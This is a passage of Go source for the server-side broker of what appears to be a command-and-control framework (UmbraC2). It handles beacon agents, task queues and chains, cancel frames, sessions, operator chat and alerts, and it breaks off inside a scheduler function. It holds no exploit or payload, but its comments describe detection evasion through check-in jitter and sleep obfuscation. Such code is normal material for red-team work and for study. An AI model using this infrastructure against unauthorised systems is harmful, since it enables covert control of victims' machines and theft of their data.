// Package hub is the broker that ties agents, the task queue and operator
// subscribers together. Transports only speak frames; all state transitions
// happen here so TCP and HTTP behave identically.
package hub

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"sort"
	"strings"
	"sync"
	"time"
	"unicode/utf8"

	"github.com/thesyntax1/UmbraC2/server/internal/config"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
)

// Version is the server release, advertised in HELLO_ACK metadata.
const Version = "0.1.0"

// Errors returned by hub operations (mapped to operator-facing messages).
var (
	ErrNoSuchAgent = errors.New("no such agent")
	ErrTooMany     = errors.New("agent capacity reached")
)

// Event is pushed to subscribed operators.
type Event struct {
	Kind    string         `json:"kind"`
	AgentID string         `json:"agent_id,omitempty"`
	TaskID  string         `json:"task_id,omitempty"`
	Data    map[string]any `json:"data,omitempty"`
	At      time.Time      `json:"at"`
	// Seq is the number of the event in the server's journal.  A console
	// that reconnects asks for the events after the last one it saw, and
	// nothing that happened in between is lost.
	Seq uint64 `json:"seq,omitempty"`
	// From and To address an event to one console. An empty To broadcasts, as
	// everything did before directed chat existed.
	From string `json:"from,omitempty"`
	To   string `json:"to,omitempty"`
}

// forOperator reports whether a console subscribed as `name` should receive
// this event. Directed events still reach their sender: a console showing its
// own outgoing message should not have to guess that it was delivered.
func (e Event) forOperator(name string) bool {
	return e.To == "" || name == e.To || name == e.From
}

// Operator is a subscribed control channel.
type Operator struct {
	ID     int64
	Name   string
	Events chan Event
	Since  time.Time
	// Peer and Transport identify where the operator connected from; both are
	// recorded in the audit log so an entry can be traced to a session.
	Peer      string
	Transport string
	// Role is the authorisation level resolved from the keyring.
	Role string
	// Focus is the agent this console is currently working on. It is how a
	// team avoids three operators reading the same shell history at once.
	Focus   string
	FocusAt time.Time
	// LastSeen is touched on every RPC, so a stalled console is visible.
	LastSeen time.Time
}

// OperatorInfo is the public view of a connected operator console.
type OperatorInfo struct {
	ID        int64  `json:"id"`
	Name      string `json:"name"`
	Role      string `json:"role"`
	Peer      string `json:"peer"`
	Transport string `json:"transport"`
	Since     string `json:"since"`
	// Backlog is how many events are queued for this console but not yet sent.
	// A persistently growing backlog means the console stopped reading.
	Backlog int `json:"backlog"`
	// Focus is the agent this console selected, empty when it has none.
	Focus   string `json:"focus,omitempty"`
	FocusAt string `json:"focus_at,omitempty"`
	// IdleSec is how long since this console last sent an RPC.
	IdleSec int `json:"idle_sec"`
}

// Live describes a currently connected agent.
type Live struct {
	AgentID   string
	Transport string
	Addr      string
	Suite     byte
	SessionID string
	Since     time.Time
}

// journalSize is how many events the journal keeps.
const journalSize = 2000

// journal is the ring buffer of the recent events.
//
// The live stream is for the consoles that are watching; the journal is
// for the ones that were not.  A console that was closed for a minute can
// ask for what it missed instead of guessing.
type journal struct {
	mu     sync.Mutex
	events []Event
	seq    uint64
}

func newJournal(size int) *journal {
	return &journal{events: make([]Event, 0, size)}
}

// append stores an event and gives it its number.
func (j *journal) append(ev Event) Event {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.seq++
	ev.Seq = j.seq
	j.events = append(j.events, ev)
	if len(j.events) > cap(j.events) {
		// The oldest events fall off the front.
		copy(j.events, j.events[len(j.events)-cap(j.events):])
		j.events = j.events[:cap(j.events)]
	}
	return ev
}

// after returns the events with a number greater than the given one,
// newest last, at most limit of them.
func (j *journal) after(seq uint64, limit int) []Event {
	j.mu.Lock()
	defer j.mu.Unlock()
	out := make([]Event, 0, len(j.events))
	for _, ev := range j.events {
		if ev.Seq > seq {
			out = append(out, ev)
		}
	}
	if limit > 0 && len(out) > limit {
		out = out[len(out)-limit:]
	}
	return out
}

// Hub owns all shared state.
type Hub struct {
	cfg   *config.Config
	store *store.Store
	log   *slog.Logger

	mu      sync.Mutex
	live    map[string]*Live
	subs    map[int64]*Operator
	nextSub int64
	started time.Time

	// dropped counts events discarded because a console's queue was full. It is
	// a health signal, not noise: if it grows, an operator is missing events.
	dropped uint64

	// chat keeps the last few chat messages so a console that joins late can
	// see the conversation it missed.
	chat []ChatMessage

	// cancels holds task ids the operators cancelled after they were delivered
	// to a beacon. The next check-in carries a TASK_CANCEL frame for each, so a
	// task still sitting in the beacon's batch is not executed.
	cancels map[string][]string

	// chains holds the multi-stage tasks that are still running, and
	// chainTasks maps a task id to the chain it belongs to.
	chains     map[string]*Chain
	chainTasks map[string]string

	// alertCool remembers when a rule last fired, so a noisy event does not
	// turn into a flood of alerts.
	alertCool map[string]time.Time

	// journal keeps the recent events, so a console that was not watching
	// can still ask what it missed.
	journal *journal

	// sessions holds the interactive sessions that are open, per agent.
	// The beacon reports the id of a session with every chunk it streams,
	// so the server always knows which sessions exist.
	sessions map[string]map[string]*Session
}

// ChainStage is one step of a multi-stage task.
type ChainStage struct {
	// Kind is the task kind of the stage.
	Kind string `json:"kind"`
	// Args are the task arguments. The string values may contain the
	// placeholder {{output}}, which is replaced with the output of the
	// previous stage.
	Args map[string]any `json:"args,omitempty"`
}

// Chain is a sequence of tasks where the output of a stage becomes the input
// of the next one.
//
// The chain lives in memory only: it is a running operation, not state that
// has to survive a restart. The tasks themselves are stored as usual, so the
// history of a chain is still visible after the fact.
type Chain struct {
	ID      string       `json:"id"`
	AgentID string       `json:"agent_id"`
	Owner   string       `json:"owner,omitempty"`
	Stages  []ChainStage `json:"stages"`
	Stage   int          `json:"stage"`
	Created time.Time    `json:"created"`
}

// MaxPendingCancels bounds the cancel queue per agent; a cycle carries at most
// this many frames.
const MaxPendingCancels = 4

// MaxChatHistory bounds the in-memory chat ring.
const MaxChatHistory = 200

// ChatMessage is one operator chat line.
type ChatMessage struct {
	From string    `json:"from"`
	// To is the operator a message was addressed to; empty means the whole
	// team. It addresses a message, it does not hide it: the history stays
	// complete, because a shared operation needs a shared record.
	To   string    `json:"to,omitempty"`
	Role string    `json:"role"`
	Text string    `json:"text"`
	At   time.Time `json:"at"`
}

// Say records a chat message and pushes it to the addressed console (or to
// every console when `to` is empty).
func (h *Hub) Say(from, role, text, to string) ChatMessage {
	msg := ChatMessage{From: from, To: to, Role: role, Text: text, At: time.Now().UTC()}
	h.mu.Lock()
	h.chat = append(h.chat, msg)
	if len(h.chat) > MaxChatHistory {
		h.chat = h.chat[len(h.chat)-MaxChatHistory:]
	}
	h.mu.Unlock()
	data := map[string]any{
		"from": msg.From, "role": msg.Role, "text": msg.Text, "at": msg.At.Format(time.RFC3339),
	}
	if msg.To != "" {
		data["to"] = msg.To
	}
	h.Emit(Event{Kind: "chat", From: msg.From, To: msg.To, Data: data})
	return msg
}

// Chat returns the most recent messages, oldest first, at most limit of them.
func (h *Hub) Chat(limit int) []ChatMessage {
	h.mu.Lock()
	defer h.mu.Unlock()
	if limit <= 0 || limit > len(h.chat) {
		limit = len(h.chat)
	}
	out := make([]ChatMessage, limit)
	copy(out, h.chat[len(h.chat)-limit:])
	return out
}

// New creates a hub.
func New(cfg *config.Config, st *store.Store, log *slog.Logger) *Hub {
	return &Hub{
		cfg:     cfg,
		store:   st,
		log:     log,
		live:    make(map[string]*Live),
		subs:    make(map[int64]*Operator),
		cancels:    make(map[string][]string),
		chains:     make(map[string]*Chain),
		chainTasks: make(map[string]string),
		alertCool:  make(map[string]time.Time),
		journal:    newJournal(journalSize),
		sessions:   make(map[string]map[string]*Session),
		started:    time.Now().UTC(),
	}
}

// Store exposes the underlying store (read-mostly use).
func (h *Hub) Store() *store.Store { return h.store }

// Config exposes the configuration.
func (h *Hub) Config() *config.Config { return h.cfg }

// Log exposes the logger.
func (h *Hub) Log() *slog.Logger { return h.log }

// RegisterAgent records a live agent and returns the stored record.
func (h *Hub) RegisterAgent(meta *store.Agent, transport, addr string, suite byte, sessionID []byte) (*store.Agent, bool, error) {
	h.mu.Lock()
	if _, exists := h.live[meta.ID]; !exists && len(h.live) >= h.cfg.Server.Limits.MaxAgents {
		h.mu.Unlock()
		return nil, false, ErrTooMany
	}
	_, known := h.store.Agent(meta.ID)
	h.live[meta.ID] = &Live{
		AgentID:   meta.ID,
		Transport: transport,
		Addr:      addr,
		Suite:     suite,
		SessionID: fmt.Sprintf("%x", sessionID),
		Since:     time.Now().UTC(),
	}
	h.mu.Unlock()

	if meta.Sleep == 0 {
		meta.Sleep = h.cfg.Server.Beacon.Sleep
		meta.Jitter = h.cfg.Server.Beacon.Jitter
	}
	rec := h.store.UpsertAgent(meta)
	h.store.SaveAsync()
	if !known {
		h.Emit(Event{Kind: "agent.new", AgentID: rec.ID, Data: agentData(rec)})
		h.log.Info("agent registered", "agent", rec.ID, "host", rec.Host, "os", rec.OS, "transport", transport)
	} else {
		h.Emit(Event{Kind: "agent.online", AgentID: rec.ID, Data: agentData(rec)})
		h.log.Debug("agent online", "agent", rec.ID)
	}
	return rec, !known, nil
}

// UnregisterSession drops a link only if it is still the live one for the
// agent but also for the *same* session.
//
// A beacon reconnects after every cycle (TCP) or network change, so two
// sessions for one agent id coexist briefly. Without the session check the
// older goroutine's deferred cleanup deletes the newer entry and the agent
// shows as offline while it is happily beaconing.
func (h *Hub) UnregisterSession(agentID, sessionID string) {
	h.mu.Lock()
	cur, ok := h.live[agentID]
	if !ok || (sessionID != "" && cur.SessionID != sessionID) {
		h.mu.Unlock()
		return
	}
	delete(h.live, agentID)
	h.mu.Unlock()
	// The agent is only offline when it has really gone quiet: a beacon
	// closes its connection after every cycle.
	if h.store.MarkOffline(agentID) {
		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
	}
	h.store.SaveAsync()
}

// UnregisterAgent marks an agent offline when its link drops, without checking
// which session dropped it. Used for expiry, where there is no live peer left to
// race with.
func (h *Hub) UnregisterAgent(agentID string) {
	h.mu.Lock()
	delete(h.live, agentID)
	h.mu.Unlock()
	if h.store.MarkOffline(agentID) {
		h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
	}
	h.store.SaveAsync()
}

// Live returns the live link info for an agent.
func (h *Hub) Live(agentID string) (*Live, bool) {
	h.mu.Lock()
	defer h.mu.Unlock()
	l, ok := h.live[agentID]
	if !ok {
		return nil, false
	}
	cp := *l
	return &cp, true
}

// Agents returns stored agents annotated with liveness.
func (h *Hub) Agents() []map[string]any {
	h.mu.Lock()
	live := make(map[string]*Live, len(h.live))
	for k, v := range h.live {
		cp := *v
		live[k] = &cp
	}
	h.mu.Unlock()

	agents := h.store.Agents()
	out := make([]map[string]any, 0, len(agents))
	for _, a := range agents {
		d := agentData(a)
		if l, ok := live[a.ID]; ok {
			d["transport"] = l.Transport
			d["suite"] = l.Suite
			d["session_id"] = l.SessionID
			d["connected_since"] = l.Since.Format(time.RFC3339)
		}
		out = append(out, d)
	}
	return out
}

// SubmitTask queues a command for an agent.
func (h *Hub) SubmitTask(agentID, kind string, args map[string]any) (*store.Task, error) {
	if _, ok := h.store.Agent(agentID); !ok {
		return nil, ErrNoSuchAgent
	}
	if kind == "" {
		return nil, errors.New("task kind required")
	}
	t := h.store.AddTask(&store.Task{AgentID: agentID, Kind: kind, Args: args})
	h.store.SaveAsync()
	h.Emit(Event{Kind: "task.queued", AgentID: agentID, TaskID: t.ID,
		Data: map[string]any{"kind": t.Kind, "args": t.Args}})
	h.log.Info("task queued", "agent", agentID, "task", t.ID, "kind", t.Kind)
	return t, nil
}

// SubmitChain queues the first stage of a multi-stage task.
//
// A chain is a sequence of tasks where the output of a stage becomes the
// input of the next one: find the file, hash it, upload it. The stages run
// one after the other, each on the result of the previous one.
func (h *Hub) SubmitChain(agentID, owner string, stages []ChainStage) (*store.Task, *Chain, error) {
	if _, ok := h.store.Agent(agentID); !ok {
		return nil, nil, ErrNoSuchAgent
	}
	if len(stages) == 0 {
		return nil, nil, errors.New("a chain needs at least one stage")
	}
	for i, stage := range stages {
		if stage.Kind == "" {
			return nil, nil, fmt.Errorf("stage %d has no kind", i)
		}
	}
	chain := &Chain{
		ID:      store.NewID("chain"),
		AgentID: agentID,
		Owner:   owner,
		Stages:  stages,
		Created: time.Now().UTC(),
	}
	task, err := h.SubmitTask(agentID, stages[0].Kind, stages[0].Args)
	if err != nil {
		return nil, nil, err
	}
	h.mu.Lock()
	h.chains[chain.ID] = chain
	h.chainTasks[task.ID] = chain.ID
	h.mu.Unlock()
	h.store.SetChain(task.ID, chain.ID, 0)
	h.Emit(Event{Kind: "chain.started", AgentID: agentID, TaskID: task.ID,
		Data: map[string]any{"chain": chain.ID, "stages": len(stages), "kind": stages[0].Kind}})
	return task, chain, nil
}

// Chains returns the multi-stage tasks that are still running.
func (h *Hub) Chains() []*Chain {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]*Chain, 0, len(h.chains))
	for _, chain := range h.chains {
		out = append(out, chain)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Created.After(out[j].Created) })
	return out
}

// advanceChain moves a chain to its next stage.
//
// The output of the stage that just finished is substituted into the
// arguments of the next one, so a stage can act on what the previous stage
// found.
func (h *Hub) advanceChain(agentID, taskID string, done *store.Task) {
	h.mu.Lock()
	chainID, ok := h.chainTasks[taskID]
	if !ok {
		h.mu.Unlock()
		return
	}
	chain, ok := h.chains[chainID]
	if !ok {
		delete(h.chainTasks, taskID)
		h.mu.Unlock()
		return
	}
	chain.Stage++
	if chain.Stage >= len(chain.Stages) {
		delete(h.chains, chainID)
		delete(h.chainTasks, taskID)
		h.mu.Unlock()
		h.Emit(Event{Kind: "chain.done", AgentID: agentID, TaskID: taskID,
			Data: map[string]any{"chain": chainID, "stages": chain.Stage}})
		return
	}
	next := chain.Stages[chain.Stage]
	h.mu.Unlock()

	args := substituteOutput(next.Args, done.Output)
	task, err := h.SubmitTask(agentID, next.Kind, args)
	if err != nil {
		h.Emit(Event{Kind: "chain.failed", AgentID: agentID, TaskID: taskID,
			Data: map[string]any{"chain": chainID, "err": err.Error()}})
		return
	}
	h.mu.Lock()
	h.chainTasks[task.ID] = chainID
	h.mu.Unlock()
	h.store.SetChain(task.ID, chainID, chain.Stage)
	h.Emit(Event{Kind: "chain.stage", AgentID: agentID, TaskID: task.ID,
		Data: map[string]any{"chain": chainID, "stage": chain.Stage, "kind": next.Kind}})
}

// substituteOutput replaces the {{output}} placeholder in the arguments of the
// next stage with the output of the previous one.
//
// Only string values are substituted, and only their text: the output of a
// stage is data, not code, so it is never executed.
func substituteOutput(args map[string]any, output []byte) map[string]any {
	text := string(output)
	if len(text) > 64*1024 {
		text = text[:64*1024]
	}
	out := make(map[string]any, len(args))
	for key, value := range args {
		out[key] = substituteValue(value, text)
	}
	return out
}

// substituteValue walks an argument value and substitutes the placeholder.
func substituteValue(value any, text string) any {
	switch v := value.(type) {
	case string:
		return strings.ReplaceAll(v, "{{output}}", text)
	case map[string]any:
		out := make(map[string]any, len(v))
		for key, item := range v {
			out[key] = substituteValue(item, text)
		}
		return out
	case []any:
		out := make([]any, 0, len(v))
		for _, item := range v {
			out = append(out, substituteValue(item, text))
		}
		return out
	default:
		return value
	}
}

// NextTasks marks and returns the tasks to ship in the current beacon cycle.
func (h *Hub) NextTasks(agentID string, max int) []*store.Task {
	tasks := h.store.Pending(agentID, max)
	for _, t := range tasks {
		h.Emit(Event{Kind: "task.delivered", AgentID: agentID, TaskID: t.ID})
	}
	return tasks
}

// maxEventOutput bounds the output preview carried by a task.result event.
const maxEventOutput = 4096

// AppendTaskOutput stores a streamed chunk of output and notifies operators.
//
// A streaming task (an interactive session) delivers its output in pieces:
// the pieces are kept in order and pushed to the consoles as they arrive, so
// an operator sees the session while it is running.
func (h *Hub) AppendTaskOutput(agentID, taskID string, chunk []byte, meta map[string]any) {
	t, ok := h.store.AppendOutput(taskID, chunk)
	if !ok {
		h.log.Warn("output for unknown task", "agent", agentID, "task", taskID)
		return
	}
	data := map[string]any{"size": len(t.Output)}
	if len(chunk) > 0 {
		text := chunk
		if len(text) > maxEventOutput {
			text = text[:maxEventOutput]
			data["truncated"] = true
		}
		if utf8.Valid(chunk) {
			data["output"] = string(text)
		} else {
			data["binary"] = true
		}
	}
	if len(meta) > 0 {
		data["meta"] = meta
	}
	// A streamed chunk may carry the id of the session it belongs to.
	if session, _ := meta["session"].(string); session != "" {
		h.noteSession(agentID, taskID, session, len(chunk))
	}
	h.Emit(Event{Kind: "task.output", AgentID: agentID, TaskID: taskID, Data: data})
}

// CompleteTask stores a result and notifies operators.
func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, errMsg string, meta map[string]any) {
	t, ok := h.store.Complete(taskID, code, output, errMsg, meta)
	if !ok {
		h.log.Warn("result for unknown task", "agent", agentID, "task", taskID)
		return
	}
	data := map[string]any{
		"code": t.Code, "state": t.State, "err": t.Err,
		"size": len(t.Output), "kind": t.Kind,
	}
	// A finished "session.close" means the session is gone.
	if t.Kind == "session.close" {
		if session, _ := t.Args["session"].(string); session != "" {
			h.closeSession(agentID, session)
		}
	}
	// Events carry a bounded preview, not the payload: a file chunk would
	// otherwise be re-sent to every watching console (and re-encoded) while the
	// full output is already available from task.get.
	if len(t.Output) > 0 {
		text := t.Output
		if len(text) > maxEventOutput {
			text = text[:maxEventOutput]
			data["truncated"] = true
		}
		if utf8.Valid(t.Output) {
			data["output"] = string(text)
		} else {
			data["binary"] = true
		}
	}
	if len(t.Meta) > 0 {
		data["meta"] = t.Meta
	}
	h.Emit(Event{Kind: "task.result", AgentID: agentID, TaskID: taskID, Data: data})
	h.store.SaveAsync()
	// A stage of a multi-stage task hands its output to the next stage.
	h.advanceChain(agentID, taskID, t)
}

// ClaimTask records that an operator took ownership of a task, so a team does
// not run the same command twice. A claim is advisory and never delays the
// beacon.
func (h *Hub) ClaimTask(taskID, operator string) (*store.Task, error) {
	t, err := h.store.Claim(taskID, operator)
	if err != nil {
		return nil, err
	}
	h.Emit(Event{Kind: "task.claimed", AgentID: t.AgentID, TaskID: t.ID, From: operator,
		Data: map[string]any{"by": operator}})
	h.store.SaveAsync()
	return t, nil
}

// ReleaseTask drops a claim so another operator can pick the task up.
func (h *Hub) ReleaseTask(taskID, operator string) (*store.Task, error) {
	t, err := h.store.Release(taskID, operator)
	if err != nil {
		return nil, err
	}
	h.Emit(Event{Kind: "task.released", AgentID: t.AgentID, TaskID: t.ID, From: operator,
		Data: map[string]any{"by": operator}})
	h.store.SaveAsync()
	return t, nil
}

// CancelTask cancels a task and, if it had already been delivered, queues a
// control frame so the beacon stops before running it.
func (h *Hub) CancelTask(taskID string) bool {
	previous, ok := h.store.Cancel(taskID)
	if !ok {
		return false
	}
	t, found := h.store.Task(taskID)
	if !found {
		return false
	}
	if previous == store.TaskDelivered {
		h.mu.Lock()
		queue := h.cancels[t.AgentID]
		if len(queue) < MaxPendingCancels {
			h.cancels[t.AgentID] = append(queue, taskID)
		} else {
			h.log.Warn("cancel queue full, dropping cancelled task id",
				"agent", t.AgentID, "task", taskID)
		}
		h.mu.Unlock()
	}
	h.Emit(Event{Kind: "task.cancelled", AgentID: t.AgentID, TaskID: taskID,
		Data: map[string]any{"was": previous}})
	return true
}

// TakeCancels returns and clears the pending cancel frames for an agent.
func (h *Hub) TakeCancels(agentID string) []string {
	h.mu.Lock()
	defer h.mu.Unlock()
	queue := h.cancels[agentID]
	if len(queue) == 0 {
		return nil
	}
	delete(h.cancels, agentID)
	return queue
}

// SetPolicy updates an agent's beacon cadence.
func (h *Hub) SetPolicy(agentID string, sleep, jitter int) error {
	if sleep < 1 || sleep > 86400 || jitter < 0 || jitter > 90 {
		return errors.New("invalid sleep/jitter")
	}
	if !h.store.SetPolicy(agentID, sleep, jitter) {
		return ErrNoSuchAgent
	}
	h.Emit(Event{Kind: "agent.policy", AgentID: agentID,
		Data: map[string]any{"sleep": sleep, "jitter": jitter}})
	h.store.SaveAsync()
	return nil
}

// Policy returns the cadence the server wants an agent to use.
func (h *Hub) Policy(agentID string) (int, int) {
	sleep, jitter, _ := h.PolicyFull(agentID)
	return sleep, jitter
}

// PolicyFull returns the cadence and the obfuscation flag the server wants an
// agent to use.
//
// The obfuscation is on unless the operator switched it off for this agent:
// a uniform check-in interval is a signature of its own, so the default is
// the safer of the two.
func (h *Hub) PolicyFull(agentID string) (int, int, bool) {
	if a, ok := h.store.Agent(agentID); ok && a.Sleep > 0 {
		return a.Sleep, a.Jitter, !a.NoObfuscate
	}
	return h.cfg.Server.Beacon.Sleep, h.cfg.Server.Beacon.Jitter, true
}

// SetPolicyFull updates the cadence and, when obfuscate is not nil, the sleep
// obfuscation flag of one agent.
func (h *Hub) SetPolicyFull(agentID string, sleep, jitter int, obfuscate *bool) error {
	if sleep < 1 || sleep > 86400 || jitter < 0 || jitter > 90 {
		return errors.New("invalid sleep/jitter")
	}
	if !h.store.SetPolicyFull(agentID, sleep, jitter, obfuscate) {
		return ErrNoSuchAgent
	}
	data := map[string]any{"sleep": sleep, "jitter": jitter}
	if obfuscate != nil {
		data["obfuscate"] = *obfuscate
	}
	h.Emit(Event{Kind: "agent.policy", AgentID: agentID, Data: data})
	h.store.SaveAsync()
	return nil
}

// SetTags changes the tags of one agent.
func (h *Hub) SetTags(agentID string, tags []string, mode string) error {
	if !h.store.SetTags(agentID, tags, mode) {
		return ErrNoSuchAgent
	}
	h.Emit(Event{Kind: "agent.tags", AgentID: agentID,
		Data: map[string]any{"tags": tags, "mode": mode}})
	h.store.SaveAsync()
	return nil
}

// AgentFilter selects the agents an operation applies to.
//
// An empty field matches everything, so a filter is only ever a narrowing of
// the inventory.  The state filter is what makes "every online Windows box"
// a one-liner.
type AgentFilter struct {
	// IDs restricts the selection to these agents (when not empty).
	IDs []string
	// State is "online", "offline" or empty (any).
	State string
	// Transport is "tcp", "http", "ws", "dns" or empty (any).
	Transport string
	// OS and Arch match the platform the beacon reported.
	OS   string
	Arch string
	// Tag requires the agent to carry this tag.
	Tag string
	// User matches the account the beacon runs as.
	User string
}

// SelectAgents returns the agents that match the filter, newest first.
func (h *Hub) SelectAgents(f AgentFilter) []*store.Agent {
	agents := h.store.Agents()
	out := make([]*store.Agent, 0, len(agents))
	for _, a := range agents {
		if len(f.IDs) > 0 && !containsString(f.IDs, a.ID) {
			continue
		}
		if f.State != "" && a.State != f.State {
			continue
		}
		if f.Transport != "" && a.Transport != f.Transport {
			continue
		}
		if f.OS != "" && !strings.EqualFold(a.OS, f.OS) {
			continue
		}
		if f.Arch != "" && !strings.EqualFold(a.Arch, f.Arch) {
			continue
		}
		if f.User != "" && !strings.EqualFold(a.User, f.User) {
			continue
		}
		if f.Tag != "" && !a.HasTag(f.Tag) {
			continue
		}
		out = append(out, a)
	}
	return out
}

// containsString reports whether the list holds the value.
func containsString(list []string, value string) bool {
	for _, item := range list {
		if item == value {
			return true
		}
	}
	return false
}

// Subscribe registers an operator event stream.
func (h *Hub) Subscribe(name, role, peer, transport string) *Operator {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.nextSub++
	op := &Operator{
		ID:        h.nextSub,
		Name:      name,
		Events:    make(chan Event, 256),
		Since:     time.Now().UTC(),
		Peer:      peer,
		Transport: transport,
		Role:      role,
		LastSeen:  time.Now().UTC(),
	}
	h.subs[op.ID] = op
	return op
}

// Touch records operator activity, so `operators.list` can show who is idle
// and who is driving the engagement.
func (h *Hub) Touch(name string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	now := time.Now().UTC()
	for _, op := range h.subs {
		if op.Name == name {
			op.LastSeen = now
		}
	}
}

// HasOperator reports whether a console with that name is connected, so a
// directed message can fail loudly instead of being addressed to nobody.
func (h *Hub) HasOperator(name string) bool {
	if name == "" {
		return false
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, op := range h.subs {
		if op.Name == name {
			return true
		}
	}
	return false
}

// SetFocus records which agent an operator is working on and returns the
// previous value. Both are broadcast so a teammate's console can follow along.
func (h *Hub) SetFocus(name, agentID string) (previous string, ok bool) {
	h.mu.Lock()
	now := time.Now().UTC()
	for _, op := range h.subs {
		if op.Name != name {
			continue
		}
		previous = op.Focus
		op.Focus = agentID
		op.FocusAt = now
		ok = true
	}
	h.mu.Unlock()
	if !ok {
		return "", false
	}
	h.Emit(Event{Kind: "operator.focus", From: name,
		Data: map[string]any{"operator": name, "agent_id": agentID}})
	return previous, true
}

// Unsubscribe removes and closes an operator stream.
func (h *Hub) Unsubscribe(id int64) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if op, ok := h.subs[id]; ok {
		close(op.Events)
		delete(h.subs, id)
	}
}

// Emit broadcasts an event without ever blocking a transport goroutine.
func (h *Hub) Emit(ev Event) {
	if ev.At.IsZero() {
		ev.At = time.Now().UTC()
	}
	// The journal keeps the event even when no console is watching.
	ev = h.journal.append(ev)
	h.mu.Lock()
	for _, op := range h.subs {
		if !ev.forOperator(op.Name) {
			continue
		}
		select {
		case op.Events <- ev:
		default:
			h.dropped++
			h.log.Warn("operator event queue full, dropping event", "operator", op.Name, "kind", ev.Kind)
		}
	}
	h.mu.Unlock()
	// The alert rules run outside the lock: they read the store and may emit
	// an event of their own.
	h.checkAlerts(ev)
}

// Session is one interactive session of an agent.
type Session struct {
	ID      string    `json:"id"`
	AgentID string    `json:"agent_id"`
	TaskID  string    `json:"task_id"`
	Opened  time.Time `json:"opened"`
	Last    time.Time `json:"last"`
	Bytes   int       `json:"bytes"`
}

// Sessions returns the open sessions of the agents.
//
// The list is what an operator wants when a session went quiet: which
// sessions are still there, and when they last said something.
func (h *Hub) Sessions() []Session {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]Session, 0, len(h.sessions))
	for _, sessions := range h.sessions {
		for _, s := range sessions {
			out = append(out, *s)
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Last.After(out[j].Last) })
	return out
}

// noteSession remembers an open session of an agent.
func (h *Hub) noteSession(agentID, taskID, session string, bytes int) {
	if session == "" {
		return
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	sessions, ok := h.sessions[agentID]
	if !ok {
		sessions = make(map[string]*Session)
		h.sessions[agentID] = sessions
	}
	now := time.Now().UTC()
	entry, ok := sessions[session]
	if !ok {
		entry = &Session{ID: session, AgentID: agentID, TaskID: taskID, Opened: now}
		sessions[session] = entry
	}
	entry.Last = now
	entry.Bytes += bytes
}

// closeSession forgets a session that was closed.
func (h *Hub) closeSession(agentID, session string) {
	if session == "" {
		return
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	if sessions, ok := h.sessions[agentID]; ok {
		delete(sessions, session)
		if len(sessions) == 0 {
			delete(h.sessions, agentID)
		}
	}
}

// Journal returns the recent events, oldest first.
//
// The events after the given sequence number are returned, so a console
// that reconnects asks for the ones it missed.
func (h *Hub) Journal(after uint64, limit int) []Event {
	return h.journal.after(after, limit)
}

// checkAlerts fires the configured alert rules.
//
// A rule is a filter on the event stream. When it matches, the server logs
// the event loudly and pushes an "alert" event of its own, so a console that
// is watching the alerts sees it even when the original event is noise.
func (h *Hub) checkAlerts(ev Event) {
	if ev.Kind == "alert" {
		// An alert never triggers another alert.
		return
	}
	rules := h.cfg.Server.Alerts
	if len(rules) == 0 {
		return
	}
	for _, rule := range rules {
		if !h.ruleMatches(rule, ev) {
			continue
		}
		if !h.allowAlert(rule) {
			continue
		}
		h.log.Warn("alert", "rule", rule.Name, "event", ev.Kind,
			"agent", ev.AgentID, "task", ev.TaskID)
		h.Emit(Event{Kind: "alert", AgentID: ev.AgentID, TaskID: ev.TaskID,
			Data: map[string]any{
				"rule":   rule.Name,
				"event":  ev.Kind,
				"detail": ev.Data,
			}})
	}
}

// ruleMatches decides whether an event trips a rule.
func (h *Hub) ruleMatches(rule config.AlertRule, ev Event) bool {
	if rule.Event != "" && rule.Event != ev.Kind {
		return false
	}
	if rule.Agent != "" && !strings.HasPrefix(ev.AgentID, rule.Agent) {
		return false
	}
	if rule.TaskKind != "" {
		kind, _ := ev.Data["kind"].(string)
		if kind != rule.TaskKind {
			return false
		}
	}
	if rule.Tag != "" {
		agent, ok := h.store.Agent(ev.AgentID)
		if !ok || !agent.HasTag(rule.Tag) {
			return false
		}
	}
	return true
}

// allowAlert applies the cooldown of a rule.
//
// An agent that checks in and out every minute would otherwise produce an
// alert every minute; the cooldown turns that into one alert per window.
func (h *Hub) allowAlert(rule config.AlertRule) bool {
	if rule.CooldownSec <= 0 {
		return true
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	now := time.Now().UTC()
	if last, ok := h.alertCool[rule.Name]; ok &&
		now.Sub(last) < time.Duration(rule.CooldownSec)*time.Second {
		return false
	}
	h.alertCool[rule.Name] = now
	return true
}

// Operators lists the connected consoles, sorted by name.
func (h *Hub) Operators() []OperatorInfo {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]OperatorInfo, 0, len(h.subs))
	for _, op := range h.subs {
		out = append(out, OperatorInfo{
			ID:        op.ID,
			Name:      op.Name,
			Role:      op.Role,
			Peer:      op.Peer,
			Transport: op.Transport,
			Since:     op.Since.Format(time.RFC3339),
			Backlog:   len(op.Events),
			Focus:     op.Focus,
			FocusAt:   focusAt(op),
			IdleSec:   int(time.Since(lastSeen(op)).Seconds()),
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out
}

// focusAt formats when an operator selected its current agent, if ever.
func focusAt(op *Operator) string {
	if op.Focus == "" || op.FocusAt.IsZero() {
		return ""
	}
	return op.FocusAt.UTC().Format(time.RFC3339)
}

// lastSeen is the operator's last activity, falling back to the moment the
// console connected when it has not sent anything yet.
func lastSeen(op *Operator) time.Time {
	if op.LastSeen.IsZero() {
		return op.Since
	}
	return op.LastSeen
}

// StartScheduler fires due recurring tasks until ctx is cancelled.
//
// The tick is one second: the protocol's smallest schedule interval is five
// seconds (store.MinScheduleInterval), so nothing can be missed, and a missed
// tick only delays a run rather than duplicating it (DueSchedules advances
// NextRun itself).
func (h *Hub) StartScheduler(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(time.Second)
